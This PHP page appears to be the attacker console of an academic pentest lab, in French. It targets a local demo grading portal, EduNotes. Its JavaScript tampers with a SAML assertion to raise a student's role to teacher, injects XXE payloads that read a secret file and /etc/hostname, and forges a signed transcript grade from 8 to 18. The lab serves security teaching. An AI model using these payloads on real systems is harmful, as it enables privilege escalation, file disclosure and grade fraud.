<?php
// attacker/index.php - Console de Cybersécurité & Proxy d'Interception (L'environnement de l'Attaquant)
require_once __DIR__ . '/../config.php';

$isTargetVuln = is_vulnerable_mode();

// Charger l'assertion de base de Mamadou Sow
$studentUser = ['email' => 'etudiant@univ.com', 'name' => 'Mamadou Sow', 'role' => 'student', 'student_id' => 'ETUD-001'];
$defaultSaml = generate_saml_assertion($studentUser);

// Charger le relevé signé officiel
$defaultReleve = generate_signed_transcript($studentUser, ['grade' => 8.0, 'course' => 'Sécurité Informatique', 'coefficient' => 2, 'comment' => 'Insuffisant']);

$secretPath = DATA_DIR . '/secret.txt';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBER ATTACK CONSOLE · XML Interceptor & Tamper Studio</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700;800&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        pre, code, textarea { font-family: 'JetBrains Mono', monospace; }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col font-sans">

    <!-- BARRE D'ÉTAT DU PROXY D'ATTAQUE -->
    <div class="bg-black border-b border-slate-800 px-6 py-3 flex items-center justify-between flex-wrap gap-4">
        <div class="flex items-center gap-3">
            <div class="w-3 h-3 rounded-full bg-red-500 animate-ping"></div>
            <div class="font-black text-sm text-red-400 tracking-wider uppercase font-mono flex items-center gap-2">
                <span>⚡</span> PENTEST CONSOLE · MITM XML PROXY (Burp Suite Simulator)
            </div>
        </div>

        <div class="flex items-center gap-4 text-xs">
            <div class="flex items-center gap-2 bg-slate-900 border border-slate-700 px-3 py-1 rounded-full">
                <span class="text-slate-400">Cible :</span>
                <span class="text-blue-400 font-mono">http://localhost:8000 (EduNotes)</span>
            </div>

            <div class="flex items-center gap-2 bg-slate-900 border border-slate-700 px-3 py-1 rounded-full">
                <span class="text-slate-400">État du serveur cible :</span>
                <span class="font-bold font-mono <?= $isTargetVuln ? 'text-red-400' : 'text-emerald-400' ?>">
                    <?= $isTargetVuln ? '⚠️ NON DURCI (Vulnérable)' : '🛡️ DURCI (Sécurisé)' ?>
                </span>
            </div>

            <a href="../admin.php" target="_blank" class="text-slate-400 hover:text-white underline text-[11px]">
                Ouvrir Console Admin DSI →
            </a>
        </div>
    </div>

    <!-- CONTENU PRINCIPAL DE L'ATTAQUANT -->
    <main class="max-w-7xl mx-auto px-4 py-8 w-full flex-grow space-y-8">

        <!-- INTRO PÉDAGOGIQUE SOUTENANCE -->
        <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 shadow-2xl">
            <h1 class="text-xl font-black text-white flex items-center gap-2">
                <span>🕵️‍♂️</span> Environnement Extérieur de l'Attaquant (Man-in-the-Middle)
            </h1>
            <p class="text-slate-400 text-xs mt-1.5 leading-relaxed">
                Ce terminal simule la machine d'un attaquant ou un proxy HTTP (type <strong>Burp Suite / SAML Raider</strong>) interceptant le trafic 
                entre l'étudiant, l'IdP universitaire et le portail EduNotes. C'est ici que l'altération du XML se déroule en direct 
                avant transmission à la victime.
            </p>
        </div>

        <!-- ONGLET 1 : ATTAQUES SUR L'ASSERTION SAML 2.0 (SC-02 & SC-03) -->
        <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-6">
            <div class="flex items-start justify-between flex-wrap gap-4 border-b border-slate-800 pb-4">
                <div>
                    <span class="bg-amber-500/20 text-amber-400 border border-amber-500/30 text-[10px] font-black uppercase px-2.5 py-0.5 rounded">
                        Interception de Flux SSO
                    </span>
                    <h2 class="text-lg font-black text-white mt-1.5">
                        Attaque 1 & 2 : Falsification de l'Assertion SAML 2.0 (POST Binding)
                    </h2>
                    <p class="text-slate-400 text-xs mt-0.5">
                        Charge interceptée en provenance de l'IdP universitaire pour l'étudiant <strong>Mamadou Sow</strong>.
                    </p>
                </div>

                <!-- RACCOURCIS D'ATTAQUE RAPIDE -->
                <div class="flex flex-wrap gap-2 text-xs font-mono">
                    <button type="button" onclick="tamperRoleTeacher()" class="bg-amber-600 hover:bg-amber-500 text-white font-bold px-3 py-1.5 rounded-lg shadow transition flex items-center gap-1.5">
                        <span>⚡</span> Falsifier Rôle : student -> teacher
                    </button>
                    <button type="button" onclick="tamperXXESecret()" class="bg-rose-600 hover:bg-rose-500 text-white font-bold px-3 py-1.5 rounded-lg shadow transition flex items-center gap-1.5">
                        <span>💥</span> Injecter XXE (secret.txt)
                    </button>
                    <button type="button" onclick="tamperXXEHostname()" class="bg-rose-700 hover:bg-rose-600 text-white font-bold px-3 py-1.5 rounded-lg shadow transition flex items-center gap-1.5">
                        <span>💥</span> Injecter XXE (/etc/hostname)
                    </button>
                    <button type="button" onclick="restoreOriginalSaml()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold px-3 py-1.5 rounded-lg border border-slate-700 transition">
                        <span>🔄</span> Reset Original
                    </button>
                </div>
            </div>

            <!-- FORMULAIRE DE TRANSMISSION VERS LE SERVICE PROVIDER (DASHBOARD.PHP) -->
            <form id="samlForm" action="../dashboard.php" method="POST" target="_blank" class="space-y-4">
                <div class="flex items-center justify-between text-xs text-slate-400">
                    <label for="saml_xml" class="font-bold text-slate-300">
                        Payload XML Intercepté (Modifiable manuellement au clavier devant le jury) :
                    </label>
                    <span class="font-mono text-[11px] text-indigo-400">Target endpoint: POST /dashboard.php</span>
                </div>

                <textarea id="saml_xml" name="saml_xml" rows="12" class="w-full text-xs bg-black text-emerald-400 p-4 rounded-xl border border-slate-800 focus:outline-none focus:ring-1 focus:ring-red-500 shadow-inner leading-relaxed"><?= htmlspecialchars($defaultSaml) ?></textarea>

                <div class="flex items-center justify-between flex-wrap gap-4 pt-2">
                    <div class="text-[11px] text-slate-500 font-mono">
                        Statut : En attente d'envoi · La signature cryptographique X.509 ne sera PAS recalculée
                    </div>
                    <button type="submit" class="bg-red-600 hover:bg-red-500 text-white font-black text-xs uppercase tracking-wider px-6 py-3 rounded-xl shadow-lg transition transform hover:scale-[1.02] flex items-center gap-2">
                        <span>🚀</span> Renvoyer la requête altérée vers EduNotes (Ouvrir dans nouvel onglet)
                    </button>
                </div>
            </form>
        </div>

        <!-- ONGLET 2 : FALSIFICATION DE RELEVÉ DE NOTES (XML-DSIG - SC-01) -->
        <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-6">
            <div class="flex items-start justify-between flex-wrap gap-4 border-b border-slate-800 pb-4">
                <div>
                    <span class="bg-blue-500/20 text-blue-400 border border-blue-500/30 text-[10px] font-black uppercase px-2.5 py-0.5 rounded">
                        Attaque XML-DSig
                    </span>
                    <h2 class="text-lg font-black text-white mt-1.5">
                        Attaque 3 : Falsification du Relevé de Notes Signé (08/20 -> 18/20)
                    </h2>
                    <p class="text-slate-400 text-xs mt-0.5">
                        Modification hors-ligne d'un relevé d'évaluation signé numériquement par l'enseignant.
                    </p>
                </div>

                <div class="flex flex-wrap gap-2 text-xs font-mono">
                    <button type="button" onclick="tamperGrade18()" class="bg-blue-600 hover:bg-blue-500 text-white font-bold px-3 py-1.5 rounded-lg shadow transition flex items-center gap-1.5">
                        <span>⚡</span> Remplacer note : 08.0 -> 18.0
                    </button>
                    <button type="button" onclick="restoreOriginalReleve()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold px-3 py-1.5 rounded-lg border border-slate-700 transition">
                        <span>🔄</span> Relevé Original (08.0)
                    </button>
                </div>
            </div>

            <!-- FORMULAIRE DE TÉLÉVERSEMENT SUR LE PORTAIL ENSEIGNANT -->
            <form action="../notes.php" method="POST" target="_blank" class="space-y-4">
                <input type="hidden" name="import_transcript" value="1">

                <textarea id="releve_xml" name="xml_text" rows="12" class="w-full text-xs bg-black text-amber-300 p-4 rounded-xl border border-slate-800 focus:outline-none focus:ring-1 focus:ring-blue-500 shadow-inner leading-relaxed"><?= htmlspecialchars($defaultReleve) ?></textarea>

                <div class="flex items-center justify-between flex-wrap gap-4 pt-2">
                    <div class="text-[11px] text-slate-500 font-mono">
                        Target endpoint: POST /notes.php (Formulaire officiel d'import de notes)
                    </div>
                    <button type="submit" class="bg-blue-600 hover:bg-blue-500 text-white font-black text-xs uppercase tracking-wider px-6 py-3 rounded-xl shadow-lg transition transform hover:scale-[1.02] flex items-center gap-2">
                        <span>📥</span> Téléverser le relevé falsifié sur EduNotes
                    </button>
                </div>
            </form>
        </div>

    </main>

    <footer class="bg-black border-t border-slate-800 py-4 px-6 text-slate-500 text-xs text-center font-mono">
        PENTEST LAB · UIDT SÉCURITÉ XML · USAGE STRICTEMENT ACADÉMIQUE
    </footer>

    <script>
        const originalSaml = <?= json_encode($defaultSaml) ?>;
        const originalReleve = <?= json_encode($defaultReleve) ?>;
        const secretPath = <?= json_encode($secretPath) ?>;

        function tamperRoleTeacher() {
            let area = document.getElementById('saml_xml');
            let val = area.value;
            if (val.includes('<saml:AttributeValue>student</saml:AttributeValue>')) {
                area.value = val.replace('<saml:AttributeValue>student</saml:AttributeValue>', '<saml:AttributeValue>teacher</saml:AttributeValue>');
                alert("⚡ Rôle modifié en direct : student -> teacher !\nLa signature RSA de l'IdP n'a pas été recalculée.");
            } else {
                alert("Le rôle student n'a pas été trouvé.");
            }
        }

        function tamperXXESecret() {
            let area = document.getElementById('saml_xml');
            let val = area.value;
            let dtd = '<!DOCTYPE samlp:Response [\n  <!ENTITY xxe SYSTEM "file://' + secretPath + '">\n]>\n';
            val = val.replace(/<!DOCTYPE[\s\S]*?\]>/gi, '');
            val = val.replace(/<\?xml.*?\?>\n?/i, function(match) { return match + '\n' + dtd; });
            val = val.replace(/<saml:AttributeValue>Mamadou Sow<\/saml:AttributeValue>/, '<saml:AttributeValue>&xxe;</saml:AttributeValue>');
            area.value = val;
            alert("💥 Charge XXE injectée pointant vers :\n" + secretPath);
        }

        function tamperXXEHostname() {
            let area = document.getElementById('saml_xml');
            let val = area.value;
            let dtd = '<!DOCTYPE samlp:Response [\n  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n]>\n';
            val = val.replace(/<!DOCTYPE[\s\S]*?\]>/gi, '');
            val = val.replace(/<\?xml.*?\?>\n?/i, function(match) { return match + '\n' + dtd; });
            val = val.replace(/<saml:AttributeValue>Mamadou Sow<\/saml:AttributeValue>/, '<saml:AttributeValue>&xxe;</saml:AttributeValue>');
            area.value = val;
            alert("💥 Charge XXE injectée pointant vers /etc/hostname !");
        }

        function restoreOriginalSaml() {
            document.getElementById('saml_xml').value = originalSaml;
            alert("🔄 Assertion SAML restaurée à son état d'origine.");
        }

        function tamperGrade18() {
            let area = document.getElementById('releve_xml');
            let val = area.value;
            if (val.includes('valeur="8.0"') || val.includes('valeur="08.0"')) {
                area.value = val.replace(/valeur="0?8\.0"/, 'valeur="18.0"');
                alert("⚡ Note falsifiée de 08.0 à 18.0 !\nLa signature XML-DSig est désormais mathématiquement invalide.");
            } else {
                alert("Note 08.0 non trouvée ou déjà modifiée.");
            }
        }

        function restoreOriginalReleve() {
            document.getElementById('releve_xml').value = originalReleve;
            alert("🔄 Relevé officiel restauré avec la note originale (08.0/20).");
        }
    </script>

</body>
</html>
